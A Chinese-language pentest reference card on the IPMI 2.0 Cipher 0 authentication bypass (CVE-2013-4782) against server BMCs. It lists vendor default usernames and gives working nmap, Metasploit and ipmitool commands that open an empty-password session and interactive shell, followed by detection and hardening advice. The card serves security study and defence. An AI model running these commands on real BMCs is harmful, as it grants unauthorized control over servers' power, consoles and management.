---
id: iot-protocol-ipmi-cipher-zero-auth-bypass
title: IPMI 2.0 Cipher 0 认证绕过：已知用户名 + 任意密码登录 BMC（CVE-2013-4782）
type: scenario
domain: iot
path: iot/protocol
technique: ipmi-cipher-zero-auth-bypass
aliases:
- IPMI Cipher 0
- CVE-2013-4782
- BMC 认证绕过
- ipmi_cipher_zero
- ipmitool -C 0
- IPMI 2.0 RAKP-none
tags:
- ipmi
- bmc
- authentication-bypass
- cipher-zero
- udp-623
- hardware
- cve-2013-4782
cve:
- CVE-2013-4782
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:17:08+08:00'
  notes: 已对照原文与图 16-23 核对：Cipher Suite 表（Cipher 0 = RAKP-none/None/None）、UDP 623、MSF ipmi_cipher_zero 检测、Administrator 空密码 user list 成功、错误用户名 RAKP2 illegal parameter、ipmitool -C 0 用法均与截图一致；案例 BMC 为 ipmi_sim 模拟器，其余命令失败已在卡内说明。原文未给 BMC 固件版本，未设置 affected_versions。未验证点：未在真实硬件复现。
---

## 一句话结论

当 BMC 的 IPMI 2.0 允许 Cipher Suite 0（RAKP-none、完整性/加密均为 None）时，攻击者只要知道一个存在的用户名，就能用任意密码（甚至空密码）建立 IPMI 会话，绕过认证访问 BMC。

## 原理

- IPMI 2.0 的 Cipher Suite 是认证算法、完整性算法、加密算法的组合。Cipher 0 的组合是 `RAKP-none + None + None`，设计上用于可信内网的快速/不记名访问。
- RAKP-none 表示 RAKP 握手不做密码认证：BMC 只根据用户名/角色建立会话 ID 与权限级别，不校验用户密钥，也不做报文完整性检查。
- 很多服务器厂商（Supermicro、Dell、HP 等）的 BMC 固件默认启用 Cipher 0 且未限制权限，导致“知道用户名即可登录”。这正是 CVE-2013-4782。
- 利用不需要破解密码：`ipmitool -I lanplus -C 0 -H <ip> -U <valid_user> -P "" ...` 即可；Metasploit 的 `auxiliary/scanner/ipmi/ipmi_cipher_zero` 通过发送 RMCP+ Open Session Request 并观察响应是否接受 Cipher 0 来检测。
- 用户名必须存在（错误用户名会在 RAKP 2 返回 illegal parameter）；厂商默认用户名可先尝试：Supermicro `ADMIN`、Dell iDRAC `root`、HP iLO `Administrator`、IBM/Lenovo `USERID`、Fujitsu iRMC `admin`。
- 真实硬件上，BMC 会话可执行电源控制、传感器读取、Serial-over-LAN、虚拟媒体挂载等管理操作；案例中的 BMC 是高度阉割的模拟器，仅 `user list` 成功，但仍证明认证绕过成立。

## 触发条件

- 目标 BMC 开放 UDP 623（IPMI over LAN），且可从攻击者网络访问。
- BMC 固件支持并启用 Cipher Suite 0。
- 攻击者知道一个存在的 IPMI 用户名（厂商默认用户名、泄露的配置、社工/枚举）。
- BMC 未在管理网络层限制 IPMI 访问。

## 利用步骤

1. 探测 UDP 623：`nmap -sU -p 623 <ip>`，确认 `asf-rmcp` 开放。
2. 检测 Cipher 0：Metasploit `use auxiliary/scanner/ipmi/ipmi_cipher_zero`，设置 `RHOSTS` 后 `run`；出现 `Accepted a session open request for cipher zero` 即存在。
3. 猜测/获取有效用户名：先试厂商默认用户名（大小写敏感）。
4. 用 ipmitool 以 Cipher 0 建立会话：`ipmitool -I lanplus -C 0 -H <ip> -U <user> -P "" user list`。
5. 成功后按 BMC 能力继续：`chassis status`、`power`、`sol activate`、`fru print`、`sdr` 等；若命令失败，可能是模拟器/权限受限，不代表认证绕过失败。

## PoC

```bash
# 1. 探测 IPMI 服务
sudo nmap -sU -p 623 <target>

# 2. Metasploit 检测 Cipher 0
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS <target>
run
# [+] <target>:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero

# 3. 用已知用户名 + 空密码建立会话
ipmitool -I lanplus -C 0 -H <target> -U Administrator -P "" user list
# ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
# 2   Administrator    true    false      true       USER

# 4. 交互式 shell
ipmitool -I lanplus -C 0 -H <target> -U Administrator -P "" shell
ipmitool> user list
```

```text
# 用户名错误时的典型报错：
# RAKP 2 message indicates an error : illegal parameter
# Error: Unable to establish IPMI v2 / RMCP+ session
```

## 变体与关联

- 变体：RAKP-none 配置下如果 BMC 允许 null username（ULength=0），甚至可以不提供用户名直接访问。
- 变体：IPMI 2.0 RAKP 哈希泄露可先拿到用户 HMAC 并离线破解，再用真实密码登录，见关联卡。
- 变体：IPMI 1.5 的 Cipher 0 类似；不同厂商的默认用户名不同，需按固件调整。
- 关联：[[iot-protocol-ipmi-rakp-hash-disclosure]]（同一 UDP 623 的哈希泄露）、[[pentest-initial-access-exposed-rdp-nat-guest]]（同属暴露管理面）。
- 边界：BMC 禁用 Cipher 0、只允许强认证、UDP 623 被防火墙/管理网隔离、无有效用户名时，本场景不成立。

## 检测与防御

- 检测：UDP 623 出现非管理网来源的 IPMI 会话；BMC 日志中出现 Cipher 0/RAKP-none 会话、异常用户名枚举；`ipmitool` 特征（RMCP+ Open Session Request）。
- 修复：在 BMC 配置中禁用 Cipher Suite 0；升级 BMC 固件；修改默认用户名/密码；启用强认证与完整性/加密算法。
- 加固：IPMI 只监听管理网/VLAN，禁止从业务网/公网访问 UDP 623；对 BMC 做网络隔离与访问白名单；监控 IPMI 登录与会话日志。
